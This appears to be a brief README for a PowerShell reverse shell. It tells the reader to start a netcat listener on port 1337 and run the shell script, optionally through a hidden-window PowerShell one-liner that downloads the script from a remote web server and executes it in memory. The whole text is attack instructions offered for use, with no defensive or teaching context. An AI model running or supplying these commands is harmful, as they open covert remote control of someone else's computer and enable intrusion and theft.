# Basic PowerShell reverse shell

1) Use "**nc -lp 1337**" to Start a Netcat listener on port defined in rshell file
2) Execute "**rsshell.ps1**", optionally use: **powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://mywebsite.com/rshell.ps1');"** to download & execute reverse shell from a server
